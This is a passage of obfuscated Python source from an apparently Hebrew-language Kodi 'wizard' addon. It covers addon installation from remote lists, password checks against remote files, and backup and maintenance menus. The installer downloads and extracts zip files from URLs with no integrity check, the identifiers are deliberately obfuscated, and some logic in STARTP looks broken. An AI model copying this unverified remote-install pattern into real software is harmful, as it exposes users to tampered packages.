						if not SHOWADULT =='true'and OOO000O000OO000OO .lower ()=='yes':continue #line:2492
						try :#line:2493
							O0OO00OO0000O000O =xbmcaddon .Addon (id =O00O0OO0O00OO0OOO ).getAddonInfo ('path')#line:2494
							if os .path .exists (O0OO00OO0000O000O ):#line:2495
								OOOOO0OO0OO00O000 ="[COLOR green][Installed][/COLOR] %s"%OOOOO0OO0OO00O000 #line:2496
						except :#line:2497
							pass #line:2498
						O000000OOO000O0O0 +=1 #line:2499
						addFile (OOOOO0OO0OO00O000 ,'addoninstall',O00O0OO0O00OO0OOO ,O0000O0O00OO0OO00 ,description =OOOO0O0O0O0OOOOOO ,icon =OO0000000OO0OOO0O ,fanart =O0O00OO0O0OO00000 ,themeit =THEME2 )#line:2500
					if O000000OOO000O0O0 <1 :#line:2501
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2502
			else :#line:2503
				addFile ('Text File not formated correctly!','',themeit =THEME3 )#line:2504
				wiz .log ("[Addon Menu] ERROR: Invalid Format.")#line:2505
		else :#line:2506
			wiz .log ("[Addon Menu] ERROR: URL for Addon list not working.")#line:2507
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2508
			addFile ('%s'%OO0O0OO00OO0O0000 ,'',themeit =THEME3 )#line:2509
	else :wiz .log ("[Addon Menu] No Addon list added.")#line:2510
	setView ('files','viewType')#line:2511
def addonInstaller (OO00O000OO00OO000 ,O00OO0O00OO0OO0OO ):#line:2513
	if not ADDONFILE =='http://':#line:2514
		OOO00O0O000OOO0OO =wiz .workingURL (O00OO0O00OO0OO0OO )#line:2515
		if OOO00O0O000OOO0OO ==True :#line:2516
			O0O0OO0O00OO0OOOO =wiz .openURL (O00OO0O00OO0OO0OO ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2517
			OO00OO000O0O00O0O =re .compile ('name="(.+?)".+?lugin="%s".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%OO00O000OO00OO000 ).findall (O0O0OO0O00OO0OOOO )#line:2518
			if len (OO00OO000O0O00O0O )>0 :#line:2519
				for O00O0O00O0O0O0O00 ,O00OO0O00OO0OO0OO ,O000O0000000O000O ,OOO000000O0OO0OO0 ,O0OOOOO00OOOOOO0O ,O00O0O0OOO0000OO0 ,O0O000O000OO00O0O ,O0OO00000OO00O0OO ,O00OOOOO00O00OO0O in OO00OO000O0O00O0O :#line:2520
					if os .path .exists (os .path .join (ADDONS ,OO00O000OO00OO000 )):#line:2521
						O0OOOOO00OO0OO0O0 =['Launch Addon','Remove Addon']#line:2522
						O0OO0O0O0OO000000 =DIALOG .select ("[COLOR %s]Addon already installed what would you like to do?[/COLOR]"%COLOR2 ,O0OOOOO00OO0OO0O0 )#line:2523
						if O0OO0O0O0OO000000 ==0 :#line:2524
							wiz .ebi ('RunAddon(%s)'%OO00O000OO00OO000 )#line:2525
							xbmc .sleep (1000 )#line:2526
							return True #line:2527
						elif O0OO0O0O0OO000000 ==1 :#line:2528
							wiz .cleanHouse (os .path .join (ADDONS ,OO00O000OO00OO000 ))#line:2529
							try :wiz .removeFolder (os .path .join (ADDONS ,OO00O000OO00OO000 ))#line:2530
							except :pass #line:2531
							if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to remove the addon_data for:"%COLOR2 ,"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,OO00O000OO00OO000 ),yeslabel ="[B][COLOR green]Yes Remove[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2532
								removeAddonData (OO00O000OO00OO000 )#line:2533
							wiz .refresh ()#line:2534
							return True #line:2535
						else :#line:2536
							return False #line:2537
					OO0O00O0O0O000O00 =os .path .join (ADDONS ,O000O0000000O000O )#line:2538
					if not O000O0000000O000O .lower ()=='none'and not os .path .exists (OO0O00O0O0O000O00 ):#line:2539
						wiz .log ("Repository not installed, installing it")#line:2540
						if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to install the repository for [COLOR %s]%s[/COLOR]:"%(COLOR2 ,COLOR1 ,OO00O000OO00OO000 ),"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,O000O0000000O000O ),yeslabel ="[B][COLOR green]Yes Install[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2541
							OO0OO00O0000O0OOO =wiz .parseDOM (wiz .openURL (OOO000000O0OO0OO0 ),'addon',ret ='version',attrs ={'id':O000O0000000O000O })#line:2542
							if len (OO0OO00O0000O0OOO )>0 :#line:2543
								OOO0OO00O0O0O0000 ='%s%s-%s.zip'%(O0OOOOO00OOOOOO0O ,O000O0000000O000O ,OO0OO00O0000O0OOO [0 ])#line:2544
								wiz .log (OOO0OO00O0O0O0000 )#line:2545
								if KODIV >=17 :wiz .addonDatabase (O000O0000000O000O ,1 )#line:2546
								installAddon (O000O0000000O000O ,OOO0OO00O0O0O0000 )#line:2547
								wiz .ebi ('UpdateAddonRepos()')#line:2548
								wiz .log ("Installing Addon from Kodi")#line:2550
								O00OOOOOOOO0O00OO =installFromKodi (OO00O000OO00OO000 )#line:2551
								wiz .log ("Install from Kodi: %s"%O00OOOOOOOO0O00OO )#line:2552
								if O00OOOOOOOO0O00OO :#line:2553
									wiz .refresh ()#line:2554
									return True #line:2555
							else :#line:2556
								wiz .log ("[Addon Installer] Repository not installed: Unable to grab url! (%s)"%O000O0000000O000O )#line:2557
						else :wiz .log ("[Addon Installer] Repository for %s not installed: %s"%(OO00O000OO00OO000 ,O000O0000000O000O ))#line:2558
					elif O000O0000000O000O .lower ()=='none':#line:2559
						wiz .log ("No repository, installing addon")#line:2560
						O000O0O0OOO000O00 =OO00O000OO00OO000 #line:2561
						O0O0OO0O00O0O0O0O =O00OO0O00OO0OO0OO #line:2562
						installAddon (OO00O000OO00OO000 ,O00OO0O00OO0OO0OO )#line:2563
						wiz .refresh ()#line:2564
						return True #line:2565
					else :#line:2566
						wiz .log ("Repository installed, installing addon")#line:2567
						O00OOOOOOOO0O00OO =installFromKodi (OO00O000OO00OO000 ,False )#line:2568
						if O00OOOOOOOO0O00OO :#line:2569
							wiz .refresh ()#line:2570
							return True #line:2571
					if os .path .exists (os .path .join (ADDONS ,OO00O000OO00OO000 )):return True #line:2572
					O0O00OOOO00000OOO =wiz .parseDOM (wiz .openURL (OOO000000O0OO0OO0 ),'addon',ret ='version',attrs ={'id':OO00O000OO00OO000 })#line:2573
					if len (O0O00OOOO00000OOO )>0 :#line:2574
						O00OO0O00OO0OO0OO ="%s%s-%s.zip"%(O00OO0O00OO0OO0OO ,OO00O000OO00OO000 ,O0O00OOOO00000OOO [0 ])#line:2575
						wiz .log (str (O00OO0O00OO0OO0OO ))#line:2576
						if KODIV >=17 :wiz .addonDatabase (OO00O000OO00OO000 ,1 )#line:2577
						installAddon (OO00O000OO00OO000 ,O00OO0O00OO0OO0OO )#line:2578
						wiz .refresh ()#line:2579
					else :#line:2580
						wiz .log ("no match");return False #line:2581
			else :wiz .log ("[Addon Installer] Invalid Format")#line:2582
		else :wiz .log ("[Addon Installer] Text File: %s"%OOO00O0O000OOO0OO )#line:2583
	else :wiz .log ("[Addon Installer] Not Enabled.")#line:2584
def installFromKodi (O00OO00OO0O0000O0 ,over =True ):#line:2586
	if over ==True :#line:2587
		xbmc .sleep (2000 )#line:2588
	wiz .ebi ('RunPlugin(plugin://%s)'%O00OO00OO0O0000O0 )#line:2590
	if not wiz .whileWindow ('yesnodialog'):#line:2591
		return False #line:2592
	xbmc .sleep (1000 )#line:2593
	if wiz .whileWindow ('okdialog'):#line:2594
		return False #line:2595
	wiz .whileWindow ('progressdialog')#line:2596
	if os .path .exists (os .path .join (ADDONS ,O00OO00OO0O0000O0 )):return True #line:2597
	else :return False #line:2598
def installAddon (OO0O0OO0000OOOOO0 ,O0O00O0OOO0O000O0 ):#line:2600
	if not wiz .workingURL (O0O00O0OOO0O000O0 )==True :wiz .LogNotify ("[COLOR %s]Addon Installer[/COLOR]"%COLOR1 ,'[COLOR %s]%s:[/COLOR] [COLOR %s]קישור זיפ לא תקין![/COLOR]'%(COLOR1 ,OO0O0OO0000OOOOO0 ,COLOR2 ));return #line:2601
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:2602
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0O0OO0000OOOOO0 ),'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2603
	O00O0000O00O00O00 =O0O00O0OOO0O000O0 .split ('/')#line:2604
	O000O00000OO00000 =os .path .join (PACKAGES ,O00O0000O00O00O00 [-1 ])#line:2605
	try :os .remove (O000O00000OO00000 )#line:2606
	except :pass #line:2607
	downloader .download (O0O00O0OOO0O000O0 ,O000O00000OO00000 ,DP )#line:2608
	OOO0OOOOO00O00O0O ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0O0OO0000OOOOO0 )#line:2609
	DP .update (0 ,OOO0OOOOO00O00O0O ,'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2610
	O000OO0OOOO00O000 ,O0OOOOO00O00OOO0O ,OO0OO0000OOOOOO00 =extract .all (O000O00000OO00000 ,ADDONS ,DP ,title =OOO0OOOOO00O00O0O )#line:2611
	DP .update (0 ,OOO0OOOOO00O00O0O ,'','[COLOR %s]מתקין תלויות[/COLOR]'%COLOR2 )#line:2612
	installed (OO0O0OO0000OOOOO0 )#line:2613
	installDep (OO0O0OO0000OOOOO0 ,DP )#line:2614
	DP .close ()#line:2615
	wiz .ebi ('UpdateAddonRepos()')#line:2616
	wiz .ebi ('UpdateLocalAddons()')#line:2617
	wiz .refresh ()#line:2618
def installDep (OO0OO0O00O0O00000 ,DP =None ):#line:2620
	O000OO0O00O000000 =os .path .join (ADDONS ,OO0OO0O00O0O00000 ,'addon.xml')#line:2621
	if os .path .exists (O000OO0O00O000000 ):#line:2622
		OO00O0O00OOO00OO0 =open (O000OO0O00O000000 ,mode ='r');O0OO0O0O000O0OOOO =OO00O0O00OOO00OO0 .read ();OO00O0O00OOO00OO0 .close ();#line:2623
		OO0OOO00O0O00OOOO =wiz .parseDOM (O0OO0O0O000O0OOOO ,'import',ret ='addon')#line:2624
		for OOO00OO0O0O0O00O0 in OO0OOO00O0O00OOOO :#line:2625
			if not 'xbmc.python'in OOO00OO0O0O0O00O0 :#line:2626
				if not DP ==None :#line:2627
					DP .update (0 ,'','[COLOR %s]%s[/COLOR]'%(COLOR1 ,OOO00OO0O0O0O00O0 ))#line:2628
				wiz .createTemp (OOO00OO0O0O0O00O0 )#line:2629
def installed (OO0O000000OOOO00O ):#line:2656
	O00O0O00000OOOO0O =os .path .join (ADDONS ,OO0O000000OOOO00O ,'addon.xml')#line:2657
	if os .path .exists (O00O0O00000OOOO0O ):#line:2658
		try :#line:2659
			OOOO0000O0000O0OO =open (O00O0O00000OOOO0O ,mode ='r');O00OOO0OOO0O0OOOO =OOOO0000O0000O0OO .read ();OOOO0000O0000O0OO .close ()#line:2660
			OO00OOOOOO0O0O000 =wiz .parseDOM (O00OOO0OOO0O0OOOO ,'addon',ret ='name',attrs ={'id':OO0O000000OOOO00O })#line:2661
			OOO0000000000O00O =os .path .join (ADDONS ,OO0O000000OOOO00O ,'icon.png')#line:2662
			wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,OO00OOOOOO0O0O000 [0 ]),'[COLOR %s]מאפשר הרחבות[/COLOR]'%COLOR2 ,'2000',OOO0000000000O00O )#line:2663
		except :pass #line:2664
def youtubeMenu (url =None ):#line:2666
	if not YOUTUBEFILE =='http://':#line:2667
		if url ==None :#line:2668
			O00O00O0OOO000OOO =wiz .workingURL (YOUTUBEFILE )#line:2669
			OOOO00O0O00OOO000 =uservar .YOUTUBEFILE #line:2670
		else :#line:2671
			O00O00O0OOO000OOO =wiz .workingURL (url )#line:2672
			OOOO00O0O00OOO000 =url #line:2673
		if O00O00O0OOO000OOO ==True :#line:2674
			OO0O000O0O0OOO0O0 =wiz .openURL (OOOO00O0O00OOO000 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2675
			OO0OOO00O000OO00O =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (OO0O000O0O0OOO0O0 )#line:2676
			if len (OO0OOO00O000OO00O )>0 :#line:2677
				for OO0O0OOOOO00OOO00 ,OOO0O00OOO00000OO ,url ,OO0O0O0OOO00O0000 ,OO0O0OO00OO000O0O ,OOO0OOO0000OOOOO0 in OO0OOO00O000OO00O :#line:2678
					if OOO0O00OOO00000OO .lower ()=="yes":#line:2679
						addDir ("[B]%s[/B]"%OO0O0OOOOO00OOO00 ,'youtube',url ,description =OOO0OOO0000OOOOO0 ,icon =OO0O0O0OOO00O0000 ,fanart =OO0O0OO00OO000O0O ,themeit =THEME3 )#line:2680
					else :#line:2681
						addFile (OO0O0OOOOO00OOO00 ,'viewVideo',url =url ,description =OOO0OOO0000OOOOO0 ,icon =OO0O0O0OOO00O0000 ,fanart =OO0O0OO00OO000O0O ,themeit =THEME2 )#line:2682
			else :wiz .log ("[YouTube Menu] ERROR: Invalid Format.")#line:2683
		else :#line:2684
			wiz .log ("[YouTube Menu] ERROR: URL for YouTube list not working.")#line:2685
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2686
			addFile ('%s'%O00O00O0OOO000OOO ,'',themeit =THEME3 )#line:2687
	else :wiz .log ("[YouTube Menu] No YouTube list added.")#line:2688
	setView ('files','viewType')#line:2689
def STARTP ():#line:2690
	O00O00OO0O000O000 =(ADDON .getSetting ("pass"))#line:2691
	if BUILDNAME =="":#line:2692
	 if not NOTIFY =='true':#line:2693
          O0OO0O0O0O0OO0O00 =wiz .workingURL (NOTIFICATION )#line:2694
	 if not NOTIFY2 =='true':#line:2695
          O0OO0O0O0O0OO0O00 =wiz .workingURL (NOTIFICATION2 )#line:2696
	 if not NOTIFY3 =='true':#line:2697
          O0OO0O0O0O0OO0O00 =wiz .workingURL (NOTIFICATION3 )#line:2698
	O00OO00O0000OOO00 =O00O00OO0O000O000 #line:2699
	O0OO0O0O0O0OO0O00 =urllib2 .Request (SPEED )#line:2700
	O0O00O0O0O000O0O0 =urllib2 .urlopen (O0OO0O0O0O0OO0O00 )#line:2701
	O000O00OO0O0O0O00 =O0O00O0O0O000O0O0 .readlines ()#line:2703
	O000O0O00O0OO00OO =0 #line:2707
	for O00O00000OO0OO0O0 in O000O00OO0O0O0O00 :#line:2708
		if O00O00000OO0OO0O0 .split (' ==')[0 ]==O00O00OO0O000O000 or O00O00000OO0OO0O0 .split ()[0 ]==O00O00OO0O000O000 :#line:2709
			O000O0O00O0OO00OO =1 #line:2710
			break #line:2711
	if O000O0O00O0OO00OO ==0 :#line:2712
					O0OOOOO0O000O0O0O =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]הסיסמה אינה נכונה,"%(COLOR2 ),"הכנס את הסיסמה כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2713
					if O0OOOOO0O000O0O0O :#line:2715
						ADDON .openSettings ()#line:2717
						sys .exit ()#line:2719
					else :#line:2720
						sys .exit ()#line:2721
	return 'ok'#line:2725
def STARTP2 ():#line:2726
	OO00O000O00OO0O0O =(ADDON .getSetting ("user"))#line:2727
	OO00O000O0OO00O00 =(UNAME )#line:2729
	OOO0O000OOO00000O =urllib2 .urlopen (OO00O000O0OO00O00 )#line:2730
	O0O0OOOOOOO00O00O =OOO0O000OOO00000O .readlines ()#line:2731
	O0OO00O0OOOO00O0O =0 #line:2732
	for OO00OO0OO0O00OO00 in O0O0OOOOOOO00O00O :#line:2735
		if OO00OO0OO0O00OO00 .split (' ==')[0 ]==OO00O000O00OO0O0O or OO00OO0OO0O00OO00 .split ()[0 ]==OO00O000O00OO0O0O :#line:2736
			O0OO00O0OOOO00O0O =1 #line:2737
			break #line:2738
	if O0OO00O0OOOO00O0O ==0 :#line:2739
		O00O0OO00OOO00O0O =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]שם המתשמש שהוכנס אינו נכון,"%(COLOR2 ),"הכנס את שם המשתמש כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2740
		if O00O0OO00OOO00O0O :#line:2742
			ADDON .openSettings ()#line:2744
			sys .exit ()#line:2747
		else :#line:2748
			sys .exit ()#line:2749
	return 'ok'#line:2753
def passandpin ():#line:2754
	addFile ('קבל קוד אימות','getpass',name ,'getpass',themeit =THEME1 )#line:2755
	addFile ('הכנס שם משתמש','setuname',name ,'setuname',themeit =THEME1 )#line:2756
	addFile ('הכנס סיסמה','setpass',name ,'setpass',themeit =THEME1 )#line:2757
def passandUsername ():#line:2758
	ADDON .openSettings ()#line:2759
def folderback ():#line:2762
    OO0000000O00000OO =ADDON .getSetting ("path")#line:2763
    if OO0000000O00000OO :#line:2764
      OO0000000O00000OO =xbmcgui .Dialog ().browse (0 ,"בחר תקייה",'files','',False ,False ,HOME )#line:2765
      ADDON .setSetting ("path",OO0000000O00000OO )#line:2766
def backmyupbuild ():#line:2769
		addFile ('מחק את תיקיית הגיבוי שלי','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2773
		addFile ('[COLOR %s]%s[/COLOR]מיקום גיבוי: '%(COLOR2 ,MYBUILDS ),'folderback','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2774
		addFile ('גיבוי בילד שלם','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2775
		addFile ('גיבוי הגדרות סקין ותפריטים בלבד','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2777
		addFile ('גיבוי הגדרות של הרחבות כולל תפריטים וסיסמאות','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2778
		addFile ('שחזור בילד שלם','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2779
		addFile ('שחזור הגדרות','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2781
def maintMenu (view =None ):#line:2785
	OO0OOO000OOOO0O0O ='[B][COLOR green]ON[/COLOR][/B]';OO00OOOOOOO0O00OO ='[B][COLOR red]OFF[/COLOR][/B]'#line:2787
	OO0000O00O0OOO000 ='true'if AUTOCLEANUP =='true'else 'false'#line:2788
	OOO0O0O000OO0O00O ='true'if AUTOCACHE =='true'else 'false'#line:2789
	OO00O00O00OOO0O0O ='true'if AUTOPACKAGES =='true'else 'false'#line:2790
	O00000OO000OO00O0 ='true'if AUTOTHUMBS =='true'else 'false'#line:2791
	OO0O00OO00OOOO0OO ='true'if SHOWMAINT =='true'else 'false'#line:2792
	OOOOOO0O0OO0OOOOO ='true'if INCLUDEVIDEO =='true'else 'false'#line:2793
	O0O0000O000OOOO00 ='true'if INCLUDEALL =='true'else 'false'#line:2794
	O00O0O00O00OO0O00 ='true'if THIRDPARTY =='true'else 'false'#line:2795
	if wiz .Grab_Log (True )==False :OO00O000OOO00000O =0 #line:2796
	else :OO00O000OOO00000O =errorChecking (wiz .Grab_Log (True ),True ,True )#line:2797
	if wiz .Grab_Log (True ,True )==False :O00O00O0O000OOO00 =0 #line:2798
	else :O00O00O0O000OOO00 =errorChecking (wiz .Grab_Log (True ,True ),True ,True )#line:2799
	OOOO0O00O0O00O00O =int (OO00O000OOO00000O )+int (O00O00O0O000OOO00 )#line:2800
	O0O0O0O00OO0O0O0O =str (OOOO0O00O0O00O00O )+' Error(s) Found'if OOOO0O00O0O00O00O >0 else 'None Found'#line:2801
	OO00O000O000O0OO0 =': [COLOR red]Not Found[/COLOR]'if not os .path .exists (WIZLOG )else ": [COLOR green]%s[/COLOR]"%wiz .convertSize (os .path .getsize (WIZLOG ))#line:2802
	if O0O0000O000OOOO00 =='true':#line:2803
		OOOO0O00OOO0O0OOO ='true'#line:2804
		OO00OO0000OOOOOOO ='true'#line:2805
		OO00O00000OOO0OOO ='true'#line:2806
		O00000O00O000O0OO ='true'#line:2807
		O0OO00000OOO0OO0O ='true'#line:2808
		O0000OO0O0O0OOOO0 ='true'#line:2809
		O0OOO00O0O000000O ='true'#line:2810
		OOO00O0O0OOOO000O ='true'#line:2811
	else :#line:2812
		OOOO0O00OOO0O0OOO ='true'if INCLUDEBOB =='true'else 'false'#line:2813
		OO00OO0000OOOOOOO ='true'if INCLUDEPHOENIX =='true'else 'false'#line:2814
		OO00O00000OOO0OOO ='true'if INCLUDESPECTO =='true'else 'false'#line:2815
		O00000O00O000O0OO ='true'if INCLUDEGENESIS =='true'else 'false'#line:2816
		O0OO00000OOO0OO0O ='true'if INCLUDEEXODUS =='true'else 'false'#line:2817
		O0000OO0O0O0OOOO0 ='true'if INCLUDEONECHAN =='true'else 'false'#line:2818
		O0OOO00O0O000000O ='true'if INCLUDESALTS =='true'else 'false'#line:2819
		OOO00O0O0OOOO000O ='true'if INCLUDESALTSHD =='true'else 'false'#line:2820
	O0OOO0O0OO0OO00OO =wiz .getSize (PACKAGES )#line:2821
	OOOOOO0OOOOOO0O0O =wiz .getSize (THUMBS )#line:2822
	OOO00OO0O00O000O0 =wiz .getCacheSize ()#line:2823
	O000O0000O000O0O0 =O0OOO0O0OO0OO00OO +OOOOOO0OOOOOO0O0O +OOO00OO0O00O000O0 #line:2824
	OOOO0O0O0O0O0OO00 =['Daily','Always','3 Days','Weekly']#line:2825
	addDir ('[B]Cleaning Tools[/B]','maint','clean',icon =ICONMAINT ,themeit =THEME1 )#line:2826
	if view =="clean"or SHOWMAINT =='true':#line:2827
		addFile ('ניקוי מלא: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O000O0000O000O0O0 ),'fullclean',icon =ICONMAINT ,themeit =THEME3 )#line:2828
		addFile ('ניקוי קאש: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OOO00OO0O00O000O0 ),'clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2829
		addFile ('ניקוי חבילות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O0OOO0O0OO0OO00OO ),'clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2830
		addFile ('ניקוי תמונות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OOOOOO0OOOOOO0O0O ),'clearthumb',icon =ICONMAINT ,themeit =THEME3 )#line:2831
		addFile ('ניקוי תמונות ישנות','oldThumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2832
		addFile ('ניקוי קאש לוג','clearcrash',icon =ICONMAINT ,themeit =THEME3 )#line:2833
		addFile ('ניקוי חבילות ישנות','purgedb',icon =ICONMAINT ,themeit =THEME3 )#line:2834
		addFile ('התקנה נקיה','freshstart',icon =ICONMAINT ,themeit =THEME3 )#line:2835
	addDir ('[B]Addon Tools[/B]','maint','addon',icon =ICONMAINT ,themeit =THEME1 )#line:2836
	if view =="addon"or SHOWMAINT =='false':#line:2837
		addFile ('הסרת הרחבות','removeaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2838
		addDir ('הסרת מידע הרחבות','removeaddondata',icon =ICONMAINT ,themeit =THEME3 )#line:2839
		addDir ('הפעלה או ביטול הרחבות','enableaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2840
		addFile ('Enable/Disable Adult Addons','toggleadult',icon =ICONMAINT ,themeit =THEME3 )#line:2841
		addFile ('בודק עדכונים','forceupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2842
		addFile ('Hide Passwords On Keyboard Entry','hidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2843
		addFile ('Unhide Passwords On Keyboard Entry','unhidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2844
	addDir ('[B]Misc Maintenance[/B]','maint','misc',icon =ICONMAINT ,themeit =THEME1 )#line:2845
	if view =="misc"or SHOWMAINT =='true':#line:2846
		addFile ('Kodi 17 Fix','kodi17fix',icon =ICONMAINT ,themeit =THEME3 )#line:2847
		addFile ('Reload Skin','forceskin',icon =ICONMAINT ,themeit =THEME3 )#line:2848
		addFile ('Reload Profile','forceprofile',icon =ICONMAINT ,themeit =THEME3 )#line:2849
		addFile ('Force Close Kodi','forceclose',icon =ICONMAINT ,themeit =THEME3 )#line:2850
		addFile ('Upload Kodi.log','uploadlog',icon =ICONMAINT ,themeit =THEME3 )#line:2851
		addFile ('View Errors in Log: %s'%(O0O0O0O00OO0O0O0O ),'viewerrorlog',icon =ICONMAINT ,themeit =THEME3 )#line:2852
		addFile ('View Log File','viewlog',icon =ICONMAINT ,themeit =THEME3 )#line:2853
		addFile ('View Wizard Log File','viewwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2854
		addFile ('Clear Wizard Log File%s'%OO00O000O000O0OO0 ,'clearwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2855
	addDir ('[B]שחזור וגיבוי[/B]','maint','backup',icon =ICONMAINT ,themeit =THEME1 )#line:2856
	if view =="backup"or SHOWMAINT =='true':#line:2857
		addFile ('Clean Up Back Up Folder','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2858
		addFile ('Back Up Location: [COLOR %s]%s[/COLOR]'%(COLOR2 ,MYBUILDS ),'settings','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2859
		addFile ('[גיבוי]: בילד','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2860
		addFile ('[גיבוי]: פרופילים','backupgui',icon =ICONMAINT ,themeit =THEME3 )#line:2861
		addFile ('[גיבוי]: סקינים','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2862
		addFile ('[גיבוי]: אדון דאטה','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2863
		addFile ('[שחזור]: בילד מתיקיה מקומית','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2864
		addFile ('[שחזור]: פרופילים מתיקיה מקומית','restoregui',icon =ICONMAINT ,themeit =THEME3 )#line:2865
		addFile ('[שחזור]: אדון דאטה מתיקיה מקומית','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2866
		addFile ('[שחזור]: בילד מתיקיה חיצונית','restoreextzip',icon =ICONMAINT ,themeit =THEME3 )#line:2867
		addFile ('[שחזור]: פרופילים מתיקיה חיצונית','restoreextgui',icon =ICONMAINT ,themeit =THEME3 )#line:2868
		addFile ('[שחזור]: אדון דאטה מתיקיה חיצונית','restoreextaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2869
	addDir ('[B]System Tweaks/Fixes[/B]','maint','tweaks',icon =ICONMAINT ,themeit =THEME1 )#line:2870
	if view =="tweaks"or SHOWMAINT =='true':#line:2871
		if not ADVANCEDFILE =='http://'and not ADVANCEDFILE =='':#line:2872
			addDir ('Advanced Settings','advancedsetting',icon =ICONMAINT ,themeit =THEME3 )#line:2873
		else :#line:2874
			if os .path .exists (ADVANCED ):#line:2875
				addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2876
				addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2877
			addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2878
		addFile ('Scan Sources for broken links','checksources',icon =ICONMAINT ,themeit =THEME3 )#line:2879
		addFile ('Scan For Broken Repositories','checkrepos',icon =ICONMAINT ,themeit =THEME3 )#line:2880
		addFile ('Fix Addons Not Updating','fixaddonupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2881
		addFile ('Remove Non-Ascii filenames','asciicheck',icon =ICONMAINT ,themeit =THEME3 )#line:2882
		addFile ('Convert Paths to special','convertpath',icon =ICONMAINT ,themeit =THEME3 )#line:2883
		addDir ('System Information','systeminfo',icon =ICONMAINT ,themeit =THEME3 )#line:2884
	addFile ('Show All Maintenance: %s'%OO0O00OO00OOOO0OO .replace ('true',OO0OOO000OOOO0O0O ).replace ('false',OO00OOOOOOO0O00OO ),'togglesetting','showmaint',icon =ICONMAINT ,themeit =THEME2 )#line:2885
	addDir ('[I]<< Return to Main Menu[/I]',icon =ICONMAINT ,themeit =THEME2 )#line:2886
	addFile ('Third Party Wizards: %s'%O00O0O00O00OO0O00 .replace ('true',OO0OOO000OOOO0O0O ).replace ('false',OO00OOOOOOO0O00OO ),'togglesetting','enable3rd',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2887
	if O00O0O00O00OO0O00 =='true':#line:2888
		OOO0O0OO0O0OO000O =THIRD1NAME if not THIRD1NAME ==''else 'Not Set'#line:2889
		OOO0OOOO0OO00OOO0 =THIRD2NAME if not THIRD2NAME ==''else 'Not Set'#line:2890
		OOO00O00OO00OO00O =THIRD3NAME if not THIRD3NAME ==''else 'Not Set'#line:2891
		addFile ('Edit Third Party Wizard 1: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OOO0O0OO0O0OO000O ),'editthird','1',icon =ICONMAINT ,themeit =THEME3 )#line:2892
		addFile ('Edit Third Party Wizard 2: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OOO0OOOO0OO00OOO0 ),'editthird','2',icon =ICONMAINT ,themeit =THEME3 )#line:2893
